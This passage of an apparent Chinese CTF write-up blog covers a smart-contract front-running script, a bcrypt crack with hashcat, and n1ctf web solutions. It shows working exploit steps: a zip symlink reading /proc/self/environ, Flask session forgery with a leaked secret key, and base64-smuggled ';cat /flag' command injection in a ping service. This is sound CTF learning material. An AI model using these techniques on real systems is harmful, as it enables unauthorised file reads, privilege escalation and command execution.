class="string">&quot;🎯 尝试直接提交答案...&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                claim_txn = challenge_contract.functions.claim(answer).build_transaction(&#123;</span><br><span class="line">                    <span class="string">&#x27;from&#x27;</span>: deploy_address,</span><br><span class="line">                    <span class="string">&#x27;nonce&#x27;</span>: web3.eth.get_transaction_count(deploy_address),</span><br><span class="line">                    <span class="string">&#x27;gas&#x27;</span>: <span class="number">300000</span>,</span><br><span class="line">                    <span class="string">&#x27;gasPrice&#x27;</span>: web3.to_wei(<span class="string">&#x27;25&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>)</span><br><span class="line">                &#125;)</span><br><span class="line">                </span><br><span class="line">                signed_txn = web3.eth.account.sign_transaction(claim_txn, private_key=deploy_private_key)</span><br><span class="line">                tx_hash = web3.eth.send_raw_transaction(signed_txn.raw_transaction)</span><br><span class="line">                receipt = web3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;🎉 直接攻击成功!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;❌ 直接攻击失败&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;直接攻击出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试信息泄露</span></span><br><span class="line">    try_rpc_methods()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 分析创建交易</span></span><br><span class="line">    analyze_creation_transaction()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 启动抢跑监听</span></span><br><span class="line">    front_run_attack()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="谁动了我的MC？"><a href="#谁动了我的MC？" class="headerlink" title="谁动了我的MC？"></a>谁动了我的MC？</h3><p>本题超大附件已上传内网，感兴趣可以看看</p>
<p>开局一个010 password 全靠翻</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ntu.com&gt;</span><br><span class="line">Bugs: https://bugs.launchpad.net/ubuntu/+filebug</span><br><span class="line">Instal&#123;</span><br><span class="line">    <span class="string">&quot;uuid&quot;</span>: <span class="string">&quot;be296992e5af40b49c8f5f2abbdb7724&quot;</span>,</span><br><span class="line">    <span class="string">&quot;userName&quot;</span>: <span class="string">&quot;St4dminrr&quot;</span>,</span><br><span class="line">    <span class="string">&quot;passWord&quot;</span>: <span class="string">&quot;$2a$10$jtOn5mgMKwhjevsKPe/ps.CIRJ1NoP/uAFWNZos7OF8vzKKGJrIxm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;passWordType</span></span><br></pre></td></tr></table></figure>

<p>Bcrypt 直接hashcat</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">└─$</span> <span class="string">hashcat</span> <span class="string">-m</span> <span class="number">3200</span> <span class="string">./1</span> <span class="string">./passwords.txt</span></span><br><span class="line"><span class="string">hashcat</span> <span class="string">(v6.2.6)</span> <span class="string">starting</span></span><br><span class="line"></span><br><span class="line"><span class="string">OpenCL</span> <span class="string">API</span> <span class="string">(OpenCL</span> <span class="number">3.0</span> <span class="string">PoCL</span> <span class="number">5.0</span><span class="string">+debian</span>  <span class="string">Linux,</span> <span class="string">None+Asserts,</span> <span class="string">RELOC,</span> <span class="string">SPIR,</span> <span class="string">LLVM</span> <span class="number">16.0</span><span class="number">.6</span><span class="string">,</span> <span class="string">SLEEF,</span> <span class="string">DISTRO,</span> <span class="string">POCL_DEBUG)</span> <span class="bullet">-</span> <span class="string">Platform</span> <span class="comment">#1 [The pocl project]</span></span><br><span class="line"><span class="string">==================================================================================================================================================</span></span><br><span class="line"><span class="string">*</span> <span class="string">Device</span> <span class="comment">#1: cpu-haswell-Intel(R) Core(TM) i7-10870H CPU @ 2.20GHz, 2899/5863 MB (1024 MB allocatable), 2MCU</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Minimum password length supported by kernel:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">Maximum password length supported by kernel:</span> <span class="number">72</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Hashes:</span> <span class="number">1</span> <span class="string">digests;</span> <span class="number">1</span> <span class="string">unique</span> <span class="string">digests,</span> <span class="number">1</span> <span class="string">unique</span> <span class="string">salts</span></span><br><span class="line"><span class="attr">Bitmaps:</span> <span class="number">16</span> <span class="string">bits,</span> <span class="number">65536</span> <span class="string">entries,</span> <span class="number">0x0000ffff</span> <span class="string">mask,</span> <span class="number">262144</span> <span class="string">bytes,</span> <span class="number">5</span><span class="string">/13</span> <span class="string">rotates</span></span><br><span class="line"><span class="attr">Rules:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Optimizers applied:</span></span><br><span class="line"><span class="string">*</span> <span class="string">Zero-Byte</span></span><br><span class="line"><span class="string">*</span> <span class="string">Single-Hash</span></span><br><span class="line"><span class="string">*</span> <span class="string">Single-Salt</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Watchdog:</span> <span class="string">Temperature</span> <span class="string">abort</span> <span class="string">trigger</span> <span class="string">set</span> <span class="string">to</span> <span class="string">90c</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Host memory required for this attack:</span> <span class="number">0</span> <span class="string">MB</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Dictionary cache built:</span></span><br><span class="line"><span class="attr">* Filename..:</span> <span class="string">./passwords.txt</span></span><br><span class="line"><span class="attr">* Passwords.:</span> <span class="number">100</span></span><br><span class="line"><span class="attr">* Bytes.....:</span> <span class="number">1077</span></span><br><span class="line"><span class="attr">* Keyspace..:</span> <span class="number">100</span></span><br><span class="line"><span class="attr">* Runtime...:</span> <span class="number">0</span> <span class="string">secs</span></span><br><span class="line"></span><br><span class="line"><span class="string">$2a$10$jtOn5mgMKwhjevsKPe/ps.CIRJ1NoP/uAFWNZos7OF8vzKKGJrIxm:I0am0alone</span></span><br></pre></td></tr></table></figure>

<p>服务器面板密码 I0am0alone</p>
<p>继续010 搜 logged in</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Lucas</span><br><span class="line">Oscar</span><br><span class="line">Alexanda</span><br><span class="line">Dylan</span><br><span class="line">Nathan</span><br><span class="line">Ethan</span><br></pre></td></tr></table></figure>

<p>就6个不多可以爆</p>
<p>翻翻网上说用的ftbbackups模组，用volatility的linux_recover_filesystem恢复文件系统</p>
<p>&#x2F;opt&#x2F;mcsmanager&#x2F;daemon&#x2F;data&#x2F;InstanceData 下有backup文件夹可启动查看</p>
<p>在出生点周围发现一处岩浆房，坐标近似为 -405,63,132</p>
<p>小爆一下得到flag <code>nctf{I0am0alone_Nathan_-405_63_132}</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/17/train0927/" data-id="cuidkQG1MJ8l11g-gZXzYVid5" data-title="train0927" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-junior" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/10/junior/" class="article-date">
  <time class="dt-published" datetime="2025-10-10T12:06:01.000Z" itemprop="datePublished">2025-10-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h3><p>提供功能：上传压缩文件、成功解压后可以下载</p>
<p>flag 存放在根目录，文件名带随机字符：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RAND=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&#x27;a-zA-Z0-9&#x27;</span> | <span class="built_in">head</span> -c 32)</span><br><span class="line">FLAG_FILE=<span class="string">&quot;/flag-<span class="variable">$RAND</span>.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$FLAG_FILE</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> FLAG</span><br><span class="line"><span class="built_in">export</span> FLAG=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>upload 关键代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="comment"># 从session中获取当前用户的 role</span></span><br><span class="line">        role = session[<span class="string">&quot;role&quot;</span>]</span><br><span class="line">        <span class="comment"># admin 则可指定 dirname，否则随机文件夹名</span></span><br><span class="line">        <span class="keyword">if</span> role == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            dirname = request.form.get(<span class="string">&quot;dirname&quot;</span>) <span class="keyword">or</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dirname = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="comment"># 拼接 UPLOAD_FOLDER（workdir/uploads）和 dirname</span></span><br><span class="line">        target_dir = os.path.join(UPLOAD_FOLDER, dirname)</span><br><span class="line">        os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        zip_path = os.path.join(target_dir, <span class="string">&quot;upload.zip&quot;</span>)</span><br><span class="line">        file.save(zip_path)</span><br><span class="line">        <span class="comment"># 将解压文件存放在 workdir/uploads/dirname/ 下</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.system(<span class="string">f&quot;unzip -o <span class="subst">&#123;zip_path&#125;</span> -d <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;解压失败，请检查文件格式&quot;</span></span><br><span class="line"></span><br><span class="line">        os.remove(zip_path)</span><br><span class="line">        <span class="comment"># 文件下载地址 /download/dirname</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;解压完成！&lt;br&gt;下载地址: &lt;a href=&#x27;<span class="subst">&#123;url_for(<span class="string">&#x27;download&#x27;</span>, folder=dirname)&#125;</span>&#x27;&gt;<span class="subst">&#123;request.host_url&#125;</span>download/<span class="subst">&#123;dirname&#125;</span>&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>普通用户：</p>
<style>.atejcgmkbulv{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250913225038087.png" class="atejcgmkbulv" alt="image-20250913225038087">

<p>admin：</p>
<p><img src="/image-20250913231927943.png" alt="image-20250913231927943"></p>
<p>利用解压软链接可读任意文件</p>
<p>利用解压软链接也可以读取任意文件夹，但是由下载路径的不同只有admin用户才能读任意文件夹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin 可以读文件夹</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">folder</span>):</span><br><span class="line">    target_dir = os.path.join(UPLOAD_FOLDER, folder)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    files = os.listdir(target_dir)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;download.html&quot;</span>, folder=folder, files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># user 只能读文件</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;/&lt;filename&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">folder, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_FOLDER, folder ,filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">        <span class="keyword">return</span> Response(</span><br><span class="line">            content,</span><br><span class="line">            mimetype=<span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;Content-Disposition&quot;</span>: <span class="string">f&quot;attachment; filename=<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">500</span></span><br></pre></td></tr></table></figure>

<p>flask框架，可以伪造cookie，提权成为admin</p>
<p>F12 拿到 <code>session</code> 值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNUHNEsbaahdZNzU</span><br></pre></td></tr></table></figure>

<p>利用解压软链接读文件 <code>/proc/self/environ</code> ，获取 <code>FLASK_SECRET_KEY</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/environ env_link</span><br><span class="line">zip --symlinks env_link.zip env_link</span><br></pre></td></tr></table></figure>

<p>获取的  <code>FLASK_SECRET_KEY</code>为 <code>&quot;#mu0cw9F#7bBCoF!&quot;</code></p>
<p>使用flask-unsign 解码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flask-unsign</span></span><br><span class="line">flask-unsign -d -c &quot;.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNU&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">flask-cookie.py</span></span><br><span class="line">python3 flask-cookie.py decode -c &quot;.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNUHNEsbaahdZNzU&quot;</span><br></pre></td></tr></table></figure>

<p>得到 <code>&#123;&#39;role&#39;: &#39;user&#39;, &#39;username&#39;: &#39;user1&#39;&#125;</code>，修改为<code>&#123;&#39;role&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code>之后再编码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -s --secret &quot;#mu0cw9F#7bBCoF!&quot; --cookie &#x27;&#123;&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;user1&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>然后更新cookie值，构造指向根目录 &#x2F; 的软链接，同时指定文件夹为 <code>.</code> </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s / root_link</span><br><span class="line">zip --symlinks root_link.zip root_link</span><br></pre></td></tr></table></figure>

<p>上传之后，访问 <code>/download/root_link</code> 即可获取根目录文件列表，下载flagxxxxx.txt文件即可</p>
<p>exp如下：</p>
<h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>提供 <code>ping</code> 功能，用户输入合法 <code>ip</code> 地址，返回 <code>ping</code> 的结果</p>
<p>;<style>.qamshoinyvfu{zoom:67%;}</style><img src="/2025/10/10/junior/image-20250913234250983.png" class="qamshoinyvfu" alt="image-20250913234250983"></p>
<p>根据Dockerfile提示，FLAG存放在根目录</p>
<p>用户输入 <code>ip</code> 主要在 <code>run_ping</code> 函数中进行处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_ping</span>(<span class="params">ip_base64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用base64.b64decode解码得到decoded_ip，并进行一系列检查</span></span><br><span class="line">        decoded_ip = base64.b64decode(ip_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> decoded_ip.count(<span class="string">&#x27;.&#x27;</span>) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= <span class="built_in">int</span>(part) &lt; <span class="number">256</span> <span class="keyword">for</span> part <span class="keyword">in</span> decoded_ip.split(<span class="string">&#x27;.&#x27;</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ipaddress.ip_address(decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(decoded_ip) &gt; <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 对为解码的 ip_base64 进行检查</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[A-Za-z0-9+/=]+$&#x27;</span>, ip_base64):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 最后拼接到 command 的是 base64 -d ip_base64 的结构</span></span><br><span class="line">    command = <span class="string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        process = subprocess.run(command, shell=<span class="literal">True</span>, check=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure>

<p>对解码后的 <code>decoded_ip</code> 做了一系列的检查，但是拼接到 <code>command</code> 的是未解码<code>ip_base64</code></p>
<p>关键在于找出 <code>base64.b64decode</code> 和 <code>base64 -d</code> 的区别</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编码</span></span><br><span class="line">echo -n 8.8.8.8 | base64                            # 输出 OC44LjguOA==</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 base64.b64decode 解码（python）</span></span><br><span class="line">base64.b64decode(&quot;OC44LjguOA==OC44LjguOA==&quot;).decode(&#x27;utf-8&#x27;)  # 仅输出 8.8.8.8 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 <span class="built_in">base64</span> -d 解码</span></span><br><span class="line">echo -n &quot;OC44LjguOA==OC44LjguOA==&quot; | base64 -d      # 输出 8.8.8.88.8.8.8 </span><br></pre></td></tr></table></figure>

<p>exp如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">依次获取 8.8.8.8、<span class="string">&#x27;;ls /&#x27;</span>和<span class="string">&#x27;cat /flag&#x27;</span> 的<span class="built_in">base64</span>编码</span></span><br><span class="line">echo -n &quot;8.8.8.8&quot; | base64      # OC44LjguOA==</span><br><span class="line">echo -n &quot;;ls /&quot; | base64        # O2xzIC8=</span><br><span class="line">echo -n &quot;;cat /flag&quot; | base64   # O2NhdCAvZmxhZw==</span><br></pre></td></tr></table></figure>

<p>正常<code>ping</code> 一个<code>ip</code>地址，bp改包依次获取 根目录文件，查看<code>/flag</code>内容</p>
<p><img src="/image-20250914001106283.png" alt="image-20250914001106283"></p>
<h3 id="unfinished"><a href="#unfinished" class="headerlink" title="unfinished"></a>unfinished</h3><p>用户注册、登录之后，可写入笔记、然后提交审核，典型XSS</p>
<style>.fgarjeahbshi{zoom:80%;}</style><img src="/2025/10/10/junior/image-20250914001412760.png" class="fgarjeahbshi" alt="image-20250914001412760">

<p>flag存放在网页的cookie中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">context.add_cookies([&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">    <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span></span><br><span class="line">&#125;])</span><br></pre></td></tr></table></figure>

<p>关键是判断xss点，以及怎么触发</p>
<p>从<code>/profile</code>中写入的内容会被存放在当前用户的 <code>bio</code>，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        current_user.bio = request.form[<span class="string">&#x27;bio&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(current_user.bio)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>提供 <code>/api/bio/&lt;string:username&gt;</code>访问写入的 bio，但是直接访问返回 403</p>
<p>查看 nginx.conf 配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location /api/bio/ &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br><span class="line">location ~ \.(css|js)$ &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:5000;</span><br><span class="line">    proxy_ignore_headers Vary;</span><br><span class="line">    proxy_cache static_cache;      // 启用 Nginx 缓存，缓存区域叫 static_cache</span><br><span class="line">    proxy_cache_valid 200 10m;     // 缓存有效期为 10 分钟</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当请求的路径以 “.css”或者“.js”结尾时，就读取缓存的内容，而不是请求远程服务器</p>
<p>通过 <code>/view</code> 路由触发机器人通过 visit_url 函数访问 我们写入 bio 的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # I found a bug in it.</span></span><br><span class="line"><span class="string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>,default=current_user.username)</span><br><span class="line">    